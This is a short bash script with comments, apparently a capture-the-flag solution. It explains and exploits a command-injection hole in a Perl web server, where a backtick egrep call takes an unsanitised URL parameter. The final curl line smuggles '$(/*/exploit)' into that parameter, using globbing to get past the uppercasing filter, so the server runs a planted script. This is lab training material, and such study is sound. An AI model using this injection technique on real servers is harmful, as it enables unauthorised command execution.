#!/bin/bash
# This time we're dealing with a server coded in perl.
# 
# We can see that the server is listening on localhost:4646.
# It parses incoming HTTP requests and passes the first two URL parameters named
# x and y to a subroutine called t :
#
# 	n(t(param("x"), param("y")));
# 
# There is a vulnerability in this line of t :
# 
#   @output = `egrep "^$xx" /tmp/xd 2>&1`;
# 
# We can see that a subshell is created and a call to egrep is made which uses
# the variable $xx as argument. $xx is a modified version of x.
# 
# It is modified by 2 regexes :
#   $xx =~ tr/a-z/A-Z/;
#   $xx =~ s/\s.*//;
# 
# The first regex uppercases every letter.
# The second one will remove every character after the first whitespace found.
# We can exploit the fact that there's not enough sanitization on the URL
# parameter x to execute a script on behalf of user flag12.
# To do so, we can create a script located somewhere with a name in uppercase,
# that will call getflag and redirect the output to another file.

echo -n "getflag > /tmp/flag12" > /tmp/EXPLOIT
chmod +x /tmp/EXPLOIT

# We can't include the directory name in the content of the URL parameter
# because the regex will uppercase it.
# We can use globbing to circumvent that issue.
# We'll also use curl to send a GET request with ease.
# The final command is :

curl localhost:4646?x='$(/*/exploit)'
